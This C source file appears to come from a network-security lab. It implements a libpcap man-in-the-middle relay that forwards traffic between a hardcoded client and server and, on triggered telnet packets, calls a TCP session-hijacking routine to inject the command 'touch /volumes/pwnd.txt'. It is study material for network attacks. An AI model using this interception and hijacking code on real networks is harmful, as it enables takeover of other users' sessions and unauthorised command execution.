#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>

#include <pcap.h>

#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

#include "log.h"
#include "util.h"

#define NETSEC_BUF_SIZ 128

#define SERVER_IP "10.10.1.15"
#define SERVER_MAC "02:42:0a:0a:01:0f"

#define CLIENT_IP "10.10.0.4"
#define CLIENT_MAC "02:42:0a:0a:00:04"

// forward declarations
static void print_usage(const char *prg);
static char *find_eth_mac_addr(const char *iface);
pcap_t *find_pcap_dev(char *iface, struct in_addr *in_addr);
static char* build_filter_expr(const char *own_mac_addr, const char *own_ip_addr);

// externs
extern int
hijack_tcp_connection(pcap_t *handle, const u_char *pkt,
                      unsigned pktlen, struct iphdr *iphdr,
                      struct tcphdr *tcphdr, const char *cmd);
extern int
is_triggered(struct iphdr *iphdr, struct tcphdr *tcphdr);

// hold the current machine's mac address
static char in_mac_addr[NETSEC_BUF_SIZ];
static char fwd_mac_addr[NETSEC_BUF_SIZ];
// interface to listen on
static char *listen_iface = 0;
// interface to forward on
static char *fwd_iface = 0;

void forward_pkt(pcap_t *fwd_handle, const u_char *pkt, unsigned pktlen) {
  struct ether_header *eth_hdr;
  struct ether_addr *eth_addr;
  struct iphdr *iphdr;
  struct in_addr iaddr;
  struct tcphdr *tcp;
  int rc;

  print_log("Processing received ip packet!\n");

  // parse packet headers
  eth_hdr = (struct ether_header*)pkt;
  iphdr = (struct iphdr*)(pkt + sizeof(struct ether_header));

  // shoot the packet out on the other interface, regardless of where it is
  // going, will reuse the same packet without creating a new one.

  // First, adjust the source and destination MAC addresses
  eth_addr = ether_aton(fwd_mac_addr);
  memcpy(eth_hdr->ether_shost, eth_addr->ether_addr_octet, sizeof eth_hdr->ether_shost);

  // need to grab the destination mac address somehow
  inet_aton(CLIENT_IP, &iaddr);
  if(iphdr->daddr == iaddr.s_addr) {
    eth_addr = ether_aton(CLIENT_MAC);
    memcpy(eth_hdr->ether_dhost, eth_addr->ether_addr_octet, sizeof eth_hdr->ether_dhost);
  } else {
    inet_aton(SERVER_IP, &iaddr);
    if(iphdr->daddr == iaddr.s_addr) {
      eth_addr = ether_aton(SERVER_MAC);
      memcpy(eth_hdr->ether_dhost, eth_addr->ether_addr_octet, sizeof eth_hdr->ether_dhost);
    } else {
      print_err("Unrecognized destination IP on ingress packet, not forwarding!\n");
      return;
    }
  }

  // adjust the ip checksum
  iphdr->ttl--;
  iphdr->check = 0;
  iphdr->check = chksum((uint16_t*)iphdr, sizeof(struct iphdr));

  // check if it's a TCP packet and if we can use it to hijack the connection.
  if(iphdr->protocol == IPPROTO_TCP) {
    // grab a tcp header
    tcp = (struct tcphdr*)(pkt + sizeof(struct ether_header) + sizeof(struct iphdr));
    tcp->check = compute_tcp_checksum(tcp, iphdr);
    if(tcp->psh && tcp->ack) {
      // push & ack packet, works for telnet
      if(is_triggered(iphdr, tcp)){
        hijack_tcp_connection(fwd_handle, pkt, pktlen, iphdr, tcp, "touch /volumes/pwnd.txt");
      }
    }
  }

  rc = pcap_inject(fwd_handle, pkt, pktlen);
  if(rc == PCAP_ERROR_NOT_ACTIVATED) {
    print_err("pcap was not activated!\n");
    exit(EXIT_FAILURE);
  } else if(rc == PCAP_ERROR) {
    print_err("pcap error: %s\n", pcap_geterr(fwd_handle));
    exit(EXIT_FAILURE);
  }
}

int main(int argc, char **argv) {
  char errbuf[PCAP_ERRBUF_SIZE];
  int rc, opt;
  pcap_t *listen_handle, *fwd_handle;
  const u_char *pkt;
  int timeout_limit = 1;
  struct ether_header *eth_hdr;
  struct bpf_program filter;
  struct pcap_pkthdr *hdr;
  struct in_addr listen_ip;

  // parse command line options
  while((opt = getopt(argc, argv, "hi:o:m:")) != -1) {
    switch(opt) {
      case 'i':
        listen_iface = optarg;
        break;
      case 'h':
        print_usage(argv[0]);
        exit(EXIT_SUCCESS);
        break;
      case 'o':
        fwd_iface = optarg;
        break;
      default: /* '?' */
        print_err("Unregonized option %c\n", opt);
        print_usage(argv[0]);
        exit(EXIT_FAILURE);
        break;
    }
  }

  // some error checking
  if(!listen_iface || !fwd_iface) {
    print_err("Missing options, check usage information\n");
    print_usage(argv[0]);
    exit(EXIT_FAILURE);
  }

  // grab the mac address of the interfaces
  memcpy(in_mac_addr, find_eth_mac_addr(listen_iface), NETSEC_BUF_SIZ);
  memcpy(fwd_mac_addr, find_eth_mac_addr(fwd_iface), NETSEC_BUF_SIZ);

  // get the pcap devs for each interface
  listen_handle = find_pcap_dev(listen_iface, &listen_ip);
  fwd_handle = find_pcap_dev(fwd_iface, 0);

  // print some information
  print_log("%s listening on %s (%s) and sending on %s (%s)\n",
            argv[0], listen_iface, in_mac_addr, fwd_iface, fwd_mac_addr);

  // compile and set the listening filter
  if(pcap_compile(listen_handle,
                  &filter,
                  build_filter_expr(in_mac_addr, inet_ntoa(listen_ip)),
                  0,
                  PCAP_NETMASK_UNKNOWN) == -1) {
    print_err("Error setting filter %s on listening handle: %s\n",
              build_filter_expr(in_mac_addr, inet_ntoa(listen_ip)),
              pcap_geterr(listen_handle));
    exit(EXIT_FAILURE);
  }
  if(pcap_setfilter(listen_handle, &filter) == -1) {
    print_err("Error setting filter on listening handle: %s\n", pcap_geterr(listen_handle));
    exit(EXIT_FAILURE);
  }


  while((rc = pcap_next_ex(listen_handle, &hdr, &pkt)) >= 0) {
    forward_pkt(fwd_handle, pkt, hdr->len);
  }
  exit(EXIT_SUCCESS);
}

void print_usage(const char *prg) {
  printf("Usage: %s [-i IFACE] [-o IFACE] [-h]\n\n", prg);
  printf("\t -i IFACE         The interface to listen on.\n");
  printf("\t -o IFACE         The interface to forward on.\n");
  printf("\t -h               Print this help message and exit.\n");
}

char *find_eth_mac_addr(const char *iface) {
  char fname[NETSEC_BUF_SIZ];
  int fd;
  int rc;
  char *p;
  static char mac_addr[NETSEC_BUF_SIZ];

  snprintf(fname, NETSEC_BUF_SIZ-1, "/sys/class/net/%s/address", iface);
  fd = open(fname, O_RDONLY);
  if(!fd) {
    print_err("Cannot open %s for reading mac address.\n", fname);
    perror("Reason from strerror: ");
    exit(EXIT_FAILURE);
  }

  memset(mac_addr, 0, NETSEC_BUF_SIZ);
  if((rc = read(fd, mac_addr, NETSEC_BUF_SIZ)) <= 0) {
    print_err("Cannot read the mac address for iface %s\n", iface);
    exit(EXIT_FAILURE);
  }

  // remove trailing whitespaces
  p = mac_addr + rc;
  while(*p == '\0' || *p == '\n' || *p == ' ')
    *(p--) = 0;

  close(fd);
  return mac_addr;
}

pcap_t *find_pcap_dev(char *iface, struct in_addr *in_addr) {
  pcap_if_t *alldevp, *p;
  pcap_t *handle;
  struct sockaddr_in sockaddr;
  char errbuf[PCAP_ERRBUF_SIZE];
  int rc;

  rc = pcap_findalldevs(&alldevp, iface);
  if(rc) {
    print_err("Cound not find any suitable interface: %s\n", errbuf);
    exit(EXIT_FAILURE);
  }

  // find the interface
  for(p = alldevp; p && strcmp(p->name, iface); p = p->next);
  if(!p) {
    print_err("Could not find interface with name %s\n", iface);
    exit(EXIT_FAILURE);
  }

  handle = pcap_open_live(p->name, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS, 1, errbuf);
  if(!handle) {
    print_err("Unable to open the adapter on iface %s: %s\n", iface, errbuf);
    exit(EXIT_FAILURE);
  }

  // get the ip address, will just copy the 32 bits right away!
  // struc
  if(in_addr) {
    for(pcap_addr_t *a=p->addresses; a!=NULL; a=a->next) {
      if(a->addr->sa_family == AF_INET) {
        memcpy(in_addr, &((struct sockaddr_in*)(a->addr))->sin_addr, sizeof(struct in_addr));
        break;
      }
    }
  }

  pcap_freealldevs(alldevp);
  return handle;
}

static char* build_filter_expr(const char *own_mac_addr, const char *own_ip_addr) {
  static char expr[NETSEC_BUF_SIZ];

  // skip over packets generated by us and destined to us
  snprintf(expr, NETSEC_BUF_SIZ,
           "ip and (not ether src %s) and (not ip dst %s) and ((ip src %s) or (ip src %s))",
           own_mac_addr, own_ip_addr, CLIENT_IP, SERVER_IP);
  return expr;
}

